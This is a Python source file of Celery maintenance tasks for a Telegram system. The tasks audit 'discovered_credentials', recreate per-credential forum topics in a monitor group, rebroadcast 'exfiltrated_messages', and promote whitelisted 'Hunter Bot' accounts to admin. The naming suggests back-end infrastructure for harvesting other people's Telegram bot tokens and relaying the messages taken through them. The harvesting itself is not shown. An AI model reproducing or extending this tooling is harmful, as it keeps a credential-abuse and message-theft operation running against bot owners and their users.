from app.workers.celery_app import app
from app.core.database import db
from app.services.broadcaster_srv import BroadcasterService
from app.core.config import settings
import asyncio
import logging
from telegram.error import TelegramError

logger = logging.getLogger("audit.tasks")
logger.setLevel(logging.INFO)

def _run_sync(coro):
    """Helper to run async code in sync Celery task"""
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
    return loop.run_until_complete(coro)

@app.task(name="audit.audit_active_topics")
def audit_active_topics():
    """
    Periodic task to ensure DB state matches Telegram state.
    1. Checks if 'active' credentials have a valid topic.
    2. Verifies topic existence (via Chat Action).
    3. Triggers recovery if topic found deleted/missing.
    """
    return _run_sync(_audit_active_topics_async())

async def _audit_active_topics_async():
    broadcaster = BroadcasterService()
    await broadcaster.send_log("🛡️ **Audit**: Starting Topic Integrity Check...")
    
    # 1. Fetch all ACTIVE credentials
    try:
        response = db.table("discovered_credentials")\
            .select("id, meta, chat_id, status")\
            .in_("status", ["active", "pending"])\
            .execute()
        
        creds = response.data or []
        logger.info(f"    [Audit] Checking {len(creds)} active credentials...")
    except Exception as e:
        logger.error(f"    ❌ [Audit] DB Fetch failed: {e}")
        return f"DB Fetch failed: {e}"

    recovered_count = 0
    missing_topic_count = 0
    checked_count = 0
    
    group_id = settings.MONITOR_GROUP_ID
    
    for cred in creds:
        cred_id = cred["id"]
        meta = cred.get("meta") or {}
        topic_id = meta.get("topic_id")
        
        checked_count += 1
        
        # Case A: Active but NO topic_id in DB
        if not topic_id:
            logger.warning(f"    ⚠️ [Audit] Cred {cred_id} is ACTIVE but missing topic_id. Recovering...")
            missing_topic_count += 1
            # Trigger enrichment to create topic
            from app.workers.tasks.flow_tasks import enrich_credential
            enrich_credential.delay(cred_id)
            continue
            
        # Case B: Has topic_id, verify it exists on Telegram
        try:
            # Send 'typing' action to test if topic exists
            # This is silent to users but will fail if topic is deleted
            await broadcaster.bot.send_chat_action(
                chat_id=group_id,
                message_thread_id=topic_id,
                action="typing"
            )
            # If success, topic exists.
            await asyncio.sleep(0.2) # Rate limit
            
        except TelegramError as e:
            err_str = str(e)
            if "Topic_deleted" in err_str or "message thread not found" in err_str or "TOPIC_DELETED" in err_str:
                logger.error(f"    ❌ [Audit] Topic {topic_id} for {cred_id} is DELETED on Telegram. triggering recovery.")
                
                # 1. Clear invalid topic_id from DB
                meta["topic_id"] = None
                db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
                
                # 2. Trigger enrich via Celery
                from app.workers.tasks.flow_tasks import enrich_credential
                enrich_credential.delay(cred_id)
                
                recovered_count += 1
            elif "Flood control" in err_str:
                await asyncio.sleep(5) # Backoff
            else:
                logger.warning(f"    ⚠️ [Audit] Check failed for {cred_id} (Topic {topic_id}): {e}")
                continue # Skip message check if topic check failed
        
        # Case C: Message Integrity Check (Double Validation)
        # Check if latest DB message exists in Telegram Topic
        try:
            # Get latest broadcasted message for this credential
            last_msg_db = db.table("exfiltrated_messages")\
                .select("telegram_msg_id, id")\
                .eq("credential_id", cred_id)\
                .eq("is_broadcasted", True)\
                .order("telegram_msg_id", desc=True)\
                .limit(1)\
                .execute()
            
            if last_msg_db.data:
                db_msg_id = last_msg_db.data[0].get("telegram_msg_id")
                
                # Check real state via UserAgent
                from app.services.user_agent_srv import user_agent
                real_last_msg_id = await user_agent.get_last_message_id(group_id, topic_id)
                
                if real_last_msg_id:
                    # If DB has messages but Topic is empty or way behind
                    if real_last_msg_id < db_msg_id:
                         logger.warning(f"    🚨 [Audit] Integrity mismatch for {cred_id}! DB says {db_msg_id}, Telegram says {real_last_msg_id}. Possible data loss or deletion.")
                         # Optional: Trigger re-broadcast of missing messages?
                         # For now, just log.
                    else:
                        # logger.info(f"    ✅ [Audit] Integrity OK for {cred_id}. (DB: {db_msg_id} <= TG: {real_last_msg_id})")
                        pass
        except Exception as e:
            logger.error(f"    ⚠️ [Audit] Message integrity check failed: {e}")

    result_msg = f"🛡️ **Audit Finished**:\nChecked: {checked_count}\nMissing Topics: {missing_topic_count}\nRecovered (Deleted): {recovered_count}"
    logger.info(result_msg)
    await broadcaster.send_log(result_msg)
    return result_msg

@app.task(name="system.self_heal")
def system_self_heal():
    """
    Periodic task to reconcile Supabase DB with Telegram.
    1. Heals missing topics for ALL active credentials.
    2. Triggers a full broadcast catch-up.
    """
    return _run_sync(_system_self_heal_async())

async def _system_self_heal_async():
    from datetime import datetime, timezone
    from app.workers.tasks.flow_tasks import _broadcast_logic
    
    broadcaster = BroadcasterService()
    await broadcaster.send_log("🩹 **Self-Heal**: Starting system-wide sync and recovery...")
    
    try:
        response = db.table("discovered_credentials")\
            .select("*")\
            .eq("status", "active")\
            .execute()
        credentials = response.data or []
    except Exception as e:
        logger.error(f"    ❌ [Self-Heal] DB Error: {e}")
        return f"DB Error: {e}"

    heal_count = 0
    group_id = settings.MONITOR_GROUP_ID
    
    for cred in credentials:
        cred_id = cred["id"]
        meta = cred.get("meta") or {}
        topic_id = meta.get("topic_id")
        
        bot_username = meta.get("bot_username", "unknown")
        bot_id = meta.get("bot_id", "0")
        topic_name = f"@{bot_username} / {bot_id}"

        if not topic_id or topic_id == 0:
            try:
                new_topic_id = await broadcaster.ensure_topic(group_id, topic_name)
                meta["topic_id"] = new_topic_id
                meta["healed_at"] = datetime.now(timezone.utc).isoformat()
                
                db.table("discovered_credentials")\
                    .update({"meta": meta})\
                    .eq("id", cred_id)\
                    .execute()
                heal_count += 1
            except Exception as e:
                logger.error(f"    ❌ [Self-Heal] Failed to heal {cred_id}: {e}")

    await broadcaster.send_log(f"🏁 **Self-Heal**: Topic healing complete. Repaired {heal_count} records.")

    # Trigger Broadcast Catch-up
    try:
        result = await _broadcast_logic()
        return f"Self-Heal finished. Repaired {heal_count}. Broadcast: {result}"
    except Exception as e:
        return f"Self-Heal finished. Repaired {heal_count}. Broadcast failed: {e}"

@app.task(name="system.enforce_whitelist")
def enforce_whitelist():
    """
    Periodic task to ensure all whitelisted bots/users are:
    1. Present in the MONITOR_GROUP_ID
    2. Promoted to admin with full permissions
    """
    return _run_sync(_enforce_whitelist_async())

async def _enforce_whitelist_async():
    from app.services.user_agent_srv import user_agent
    
    broadcaster = BroadcasterService()
    await broadcaster.send_log("🛡️ **Enforce Whitelist**: Checking group membership and admin status...")

    group_id = settings.MONITOR_GROUP_ID
    raw_ids = settings.WHITELISTED_BOT_IDS or ""
    whitelist = [x.strip() for x in raw_ids.split(",") if x.strip()]

    if not whitelist:
        return "No whitelisted IDs configured."

    invited_count = 0
    promoted_count = 0
    already_ok_count = 0
    failed_count = 0

    for identifier in whitelist:
        try:
            # 1. Check if member exists in group
            member_info = await user_agent.check_membership(group_id, identifier)

            if member_info is None:
                # Not in group — invite them
                logger.info(f"    🚪 [Enforce] {identifier} not in group. Inviting...")
                
                # Determine if it's a bot ID (numeric) or username
                if str(identifier).isdigit():
                    # Numeric ID — we need to resolve it. For bots, we can try direct invite.
                    # But invite_bot_to_group expects a username, so we need to try the ID directly
                    success = await user_agent.invite_bot_to_group(identifier, group_id)
                else:
                    success = await user_agent.invite_bot_to_group(identifier, group_id)

                if success:
                    logger.info(f"    ✅ [Enforce] Invited {identifier} to group.")
                    invited_count += 1
                    await asyncio.sleep(2)  # Let Telegram propagate

                    # Now promote them
                    title = "Hunter Bot" if str(identifier).isdigit() else "Admin"
                    if await user_agent.promote_to_admin(group_id, identifier, title=title):
                        promoted_count += 1
                        logger.info(f"    👑 [Enforce] Promoted {identifier} to admin.")
                    await asyncio.sleep(1)
                else:
                    logger.warning(f"    ❌ [Enforce] Failed to invite {identifier}.")
                    failed_count += 1
            else:
                # In group — check admin status
                if not member_info.get("is_admin"):
                    logger.info(f"    ⬆️ [Enforce] {identifier} is member but not admin. Promoting...")
                    title = "Hunter Bot" if str(identifier).isdigit() else "Admin"
                    if await user_agent.promote_to_admin(group_id, identifier, title=title):
                        promoted_count += 1
                        logger.info(f"    👑 [Enforce] Promoted {identifier} to admin.")
                    else:
                        failed_count += 1
                    await asyncio.sleep(1)
                else:
                    already_ok_count += 1

        except Exception as e:
            logger.error(f"    ❌ [Enforce] Error processing {identifier}: {e}")
            failed_count += 1
            continue

    result = (
        f"🛡️ **Enforce Whitelist Complete**:\n"
        f"✅ Already OK: {already_ok_count}\n"
        f"🚪 Invited: {invited_count}\n"
        f"👑 Promoted: {promoted_count}\n"
        f"❌ Failed: {failed_count}"
    )
    logger.info(result)
    await broadcaster.send_log(result)
    return result
